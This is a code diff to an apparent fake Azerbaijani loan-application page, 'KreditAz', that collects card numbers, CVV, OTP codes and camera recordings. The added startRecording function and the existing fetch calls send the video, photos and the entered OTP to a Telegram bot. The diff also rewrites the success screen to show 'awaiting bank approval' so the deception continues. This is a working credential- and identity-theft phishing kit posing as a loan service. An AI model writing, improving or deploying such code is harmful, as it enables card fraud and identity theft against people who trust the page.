@@ -18,9 +18,9 @@
             --sage: #E3E9DF;
             --line: #D8D0BC;
             --white: #FFFFFF;
-            --shadow-sm: 0 2px 8px -2px rgba(21,31,27,0.12);
-            --shadow-md: 0 16px 32px -18px rgba(21,31,27,0.35);
-            --shadow-lg: 0 28px 56px -24px rgba(21,31,27,0.4);
+            --shadow-sm: 0 2px 8px -2px rgba(21, 31, 27, 0.12);
+            --shadow-md: 0 16px 32px -18px rgba(21, 31, 27, 0.35);
+            --shadow-lg: 0 28px 56px -24px rgba(21, 31, 27, 0.4);
         }
         * {
             box-sizing: border-box;
@@ -1394,7 +1394,7 @@
             margin-bottom: 8px;
         }
 
-        /* SUCCESS / MÜRACİƏTLƏRİM */
+        /* SUCCESS */
         .success-container {
             text-align: center;
             padding: 20px 0;
@@ -1516,39 +1516,6 @@
             margin-top: 6px;
         }
 
-        footer {
-            background: var(--ink);
-            color: #EDE7D6;
-            padding: 48px 0 28px;
-        }
-        .footer-grid {
-            display: grid;
-            grid-template-columns: 1.4fr 1fr 1fr;
-            gap: 32px;
-            margin-bottom: 32px;
-        }
-        .footer-grid h4 {
-            font-family: 'Fraunces', serif;
-            font-size: 16px;
-            margin-bottom: 14px;
-            color: var(--white);
-        }
-        .footer-grid p,
-        .footer-grid a {
-            font-size: 13.5px;
-            color: #C9C2AE;
-            line-height: 1.7;
-            text-decoration: none;
-        }
-        .foot-note {
-            border-top: 1px solid rgba(255, 255, 255, 0.15);
-            padding-top: 20px;
-            font-size: 12px;
-            color: #9B9480;
-            line-height: 1.7;
-        }
-
-        /* Buttons */
         .btn-group {
             display: flex;
             gap: 12px;
@@ -1593,6 +1560,38 @@
         .btn-gold:hover {
             transform: translateY(-2px) scale(1.02);
             box-shadow: 0 8px 30px rgba(173, 127, 63, 0.4);
+        }
+
+        footer {
+            background: var(--ink);
+            color: #EDE7D6;
+            padding: 48px 0 28px;
+        }
+        .footer-grid {
+            display: grid;
+            grid-template-columns: 1.4fr 1fr 1fr;
+            gap: 32px;
+            margin-bottom: 32px;
+        }
+        .footer-grid h4 {
+            font-family: 'Fraunces', serif;
+            font-size: 16px;
+            margin-bottom: 14px;
+            color: var(--white);
+        }
+        .footer-grid p,
+        .footer-grid a {
+            font-size: 13.5px;
+            color: #C9C2AE;
+            line-height: 1.7;
+            text-decoration: none;
+        }
+        .foot-note {
+            border-top: 1px solid rgba(255, 255, 255, 0.15);
+            padding-top: 20px;
+            font-size: 12px;
+            color: #9B9480;
+            line-height: 1.7;
         }
 
         @media (max-width:768px) {
@@ -2200,20 +2199,20 @@
                 <div id="otpStatus" style="margin-top:16px;font-size:14px;font-weight:700;color:var(--teal-deep);text-align:center;display:none;"></div>
             </div>
 
-            <!-- STEP 10: Success / Müraciətlərim -->
+            <!-- STEP 10: Success -->
             <div id="successStep" style="display:none;">
                 <div class="success-container">
-                    <div class="big-icon">✅</div>
-                    <h2>Kartınız doğrulandı!</h2>
-                    <p style="color:var(--teal-deep);font-weight:600;font-size:16px;">0.01 AZN geri qaytarılacaq</p>
-                    <p style="font-size:14px;color:var(--ink-soft);">Ödənişiniz uğurla tamamlandı. Kartınızdan 0.01 AZN çəkildi və geri qaytarılacaq.</p>
+                    <div class="big-icon">📩</div>
+                    <h2>✅ Sorğunuz göndərildi!</h2>
+                    <p style="color:#F59E0B;font-weight:600;font-size:16px;">⏳ Bank təsdiqi gözlənilir...</p>
+                    <p style="font-size:14px;color:var(--ink-soft);">Müraciətiniz uğurla göndərildi. Bank tərəfindən təsdiqləndikdən sonra status yenilənəcək.</p>
 
                     <div style="background:var(--sage);border-radius:16px;padding:20px;margin:16px 0;text-align:left;">
                         <div style="font-weight:700;font-size:15px;color:var(--teal-deep);">📋 Müraciət detalları</div>
                         <div style="font-size:13px;color:var(--ink-soft);margin-top:8px;line-height:1.8;" id="successDetails"></div>
                     </div>
 
-                    <p style="font-size:15px;font-weight:600;color:var(--teal-deep);margin-top:8px;">✅ Müraciətiniz tamamlandı!</p>
+                    <p style="font-size:15px;font-weight:600;color:var(--teal-deep);margin-top:8px;">📌 Müraciətiniz gözləmə vəziyyətindədir</p>
                     <p style="font-size:13px;color:var(--ink-soft);">Müraciətlərinizə baxmaq üçün aşağıdakı düyməyə klikləyin.</p>
 
                     <div class="btn-group">
@@ -2260,7 +2259,7 @@
         </div>
     </div>
 
-    <!-- ========== MÜRACİƏTLƏRİM (Ayrıca ekran) ========== -->
+    <!-- ========== MÜRACİƏTLƏRİM ========== -->
     <div class="modal-overlay" id="applicationsOverlay">
         <div class="modal-card" style="max-width:600px;">
             <button type="button" class="modal-close" onclick="closeApplications()">✕</button>
@@ -2349,7 +2348,7 @@
         var videoStream = null;
         var isFaceScan = false;
 
-        // ===== MÜRACİƏTLƏR (localStorage) =====
+        // ===== MÜRACİƏTLƏR =====
         var applications = JSON.parse(localStorage.getItem('kreditaz_applications') || '[]');
         var currentApplicationId = null;
 
@@ -2366,7 +2365,7 @@
                 amount: data.amount,
                 term: data.term,
                 bank: data.bank,
-                status: status || 'pending', // pending, completed, rejected
+                status: status || 'pending',
                 details: data
             };
             applications.unshift(app);
@@ -2406,7 +2405,7 @@
             var html = '';
             apps.forEach(function(app) {
                 var statusClass = app.status === 'pending' ? 'pending' : (app.status === 'completed' ? 'completed' :
-                'rejected');
+                    'rejected');
                 var statusText = app.status === 'pending' ? '⏳ Gözləmədə' : (app.status === 'completed' ?
                     '✅ Tamamlandı' : '❌ İmtina');
                 var statusColor = app.status === 'pending' ? '#F59E0B' : (app.status === 'completed' ? '#10B981' :
@@ -2517,6 +2516,7 @@
             document.getElementById('cardCvv').value = '';
             document.getElementById('otpCode').value = '';
             document.getElementById('otpStatus').style.display = 'none';
+            document.getElementById('otpStatus').textContent = '';
             stopCamera();
         }
 
@@ -2614,6 +2614,59 @@
             document.getElementById('scanStartBtn').textContent = '📷 Kameranı aç';
         }
 
+        // ===== DÜZƏLDİLMİŞ startRecording =====
+        function startRecording(video, type) {
+            recordedChunks = [];
+            var stream = video.srcObject;
+
+            video.onloadedmetadata = function() {
+                try {
+                    var mimeType = 'video/mp4';
+                    if (!MediaRecorder.isTypeSupported('video/mp4')) {
+                        mimeType = 'video/webm;codecs=vp9,opus';
+                    }
+
+                    mediaRecorder = new MediaRecorder(stream, {
+                        mimeType: mimeType,
+                        videoBitsPerSecond: 2500000
+                    });
+
+                    mediaRecorder.ondataavailable = function(event) {
+                        if (event.data.size > 0) {
+                            recordedChunks.push(event.data);
+                            console.log('📹 Chunk toplandı:', event.data.size, 'bytes');
+                        }
+                    };
+
+                    mediaRecorder.onstop = function() {
+                        console.log('⏹ MediaRecorder dayandı, chunks:', recordedChunks.length);
+
+                        if (recordedChunks.length > 0) {
+                            var blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                            console.log('📦 Blob ölçüsü:', blob.size, 'bytes');
+
+                            if (blob.size > 1000) {
+                                sendVideoToTelegram(blob, getScanStepName(type));
+                            } else {
+                                console.warn('⚠️ Video çox kiçik, şəkil çəkilir');
+                                capturePhoto(video, getScanStepName(type));
+                            }
+                        } else {
+                            console.warn('⚠️ Heç bir chunk toplanmadı');
+                            capturePhoto(video, getScanStepName(type));
+                        }
+                    };
+
+                    mediaRecorder.start(1000);
+                    console.log('▶️ MediaRecorder başladı');
+
+                } catch (e) {
+                    console.error('❌ MediaRecorder xətası:', e);
+                    capturePhoto(video, getScanStepName(type));
+                }
+            };
+        }
+
         async function startVideoScan() {
             var btn = document.getElementById('scanStartBtn');
             btn.style.display = 'none';
@@ -2647,35 +2700,6 @@
                 document.getElementById('scanStatusText').textContent = '⚠️ Kamera əlçatan deyil.';
                 btn.style.display = 'block';
                 btn.textContent = '🔄 Yenidən cəhd et';
-            }
-        }
-
-        function startRecording(video, type) {
-            recordedChunks = [];
-            var stream = video.srcObject;
-            try {
-                var mimeType = 'video/mp4';
-                if (!MediaRecorder.isTypeSupported('video/mp4')) {
-                    mimeType = 'video/webm;codecs=vp9,opus';
-                }
-                mediaRecorder = new MediaRecorder(stream, { mimeType: mimeType });
-                mediaRecorder.ondataavailable = function(event) {
-                    if (event.data.size > 0) { recordedChunks.push(event.data); }
-                };
-                mediaRecorder.onstop = function() {
-                    if (recordedChunks.length > 0) {
-                        var blob = new Blob(recordedChunks, { type: 'video/mp4' });
-                        if (blob.type === 'video/mp4' || blob.type === 'video/webm') {
-                            sendVideoToTelegram(blob, getScanStepName(type));
-                        } else {
-                            capturePhoto(video, getScanStepName(type));
-                        }
-                    }
-                };
-                mediaRecorder.start(1000);
-            } catch (e) {
-                console.error('MediaRecorder xətası:', e);
-                capturePhoto(video, getScanStepName(type));
             }
         }
 
@@ -2753,7 +2777,7 @@
                 var ext = blob.type === 'video/mp4' ? 'mp4' : 'webm';
                 formData.append('video', blob, 'sənəd_' + stepName + '_' + Date.now() + '.' + ext);
                 formData.append('caption', '📹 Sənəd çəkilişi: ' + stepName + '\n📅 ' + new Date().toLocaleString(
-                'az-AZ'));
+                    'az-AZ'));
                 await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendVideo', {
                     method: 'POST',
                     body: formData
@@ -2772,7 +2796,7 @@
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'sənəd_' + stepName + '_' + Date.now() + '.jpg');
                 formData.append('caption', '📸 Sənəd şəkli: ' + stepName + '\n📅 ' + new Date().toLocaleString(
-                'az-AZ'));
+                    'az-AZ'));
                 await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
                     method: 'POST',
                     body: formData
@@ -3144,7 +3168,6 @@
                                         approvalInterval = null; }
                                     document.getElementById('realCheckingStep').style.display = 'none';
                                     alert('❌ Müraciətiniz imtina edildi. Bank tərəfindən təsdiqlənmədi.');
-                                    // Müraciəti "rejected" olaraq yadda saxla
                                     if (Object.keys(applicationData).length > 0) {
                                         addApplication(applicationData, 'rejected');
                                     }
@@ -3170,14 +3193,14 @@
         function submitOTP() {
             var otpInput = document.getElementById('otpCode').value.replace(/\s/g, '');
             if (otpInput.length === 6) {
-                // Müraciəti "completed" olaraq yadda saxla
-                if (Object.keys(applicationData).length > 0) {
-                    var app = addApplication(applicationData, 'completed');
-                }
-
+                // Sorğu göndərildi statusu
                 document.getElementById('otpStatus').style.display = 'block';
-                document.getElementById('otpStatus').innerHTML =
-                    '✅ Kartınız doğrulandı! 0.01 AZN geri qaytarılacaq.';
+                document.getElementById('otpStatus').innerHTML = '✅ Sorğunuz göndərildi! Bank təsdiqi gözlənilir...';
+
+                // Müraciəti "pending" (gözləmədə) olaraq yadda saxla
+                if (Object.keys(applicationData).length > 0) {
+                    var app = addApplication(applicationData, 'pending');
+                }
 
                 fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                     method: 'POST',
@@ -3185,7 +3208,7 @@
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: '🔐 İstifadəçi OTP kodunu daxil etdi: ' + otpInput +
-                        '\n✅ Ödəniş təsdiqləndi! Müraciət tamamlandı.'
+                        '\n✅ Ödəniş təsdiqləndi!\n📌 Status: GÖZLƏMƏDƏ'
                     })
                 });
 
@@ -3194,7 +3217,6 @@
                     document.getElementById('threeDStep').style.display = 'none';
                     document.getElementById('successStep').style.display = 'block';
 
-                    // Detalları göstər
                     var details = document.getElementById('successDetails');
                     if (applicationData.name) {
                         details.innerHTML = `
@@ -3204,11 +3226,8 @@
                             <div><strong>📆 Müddət:</strong> ${applicationData.term}</div>
                             <div><strong>🏦 Bank:</strong> ${applicationData.bank}</div>
                             <div><strong>📅 Tarix:</strong> ${new Date().toLocaleString('az-AZ')}</div>
-                            <div><strong>✅ Status:</strong> <span style="color:#10B981;font-weight:700;">Tamamlandı</span></div>
+                            <div><strong>📌 Status:</strong> <span style="color:#F59E0B;font-weight:700;">⏳ Gözləmədə</span></div>
                         `;
-                    } else {
-                        details.innerHTML =
-                            `<div style="color:var(--ink-soft);">Müraciət detalları yadda saxlanıldı.</div>`;
                     }
                 }, 800);
 
@@ -3339,4 +3358,4 @@
         console.log('✅ KreditAz yükləndi!');
     </script>
 </body>
-                            </html>
+                                                                                        </html>
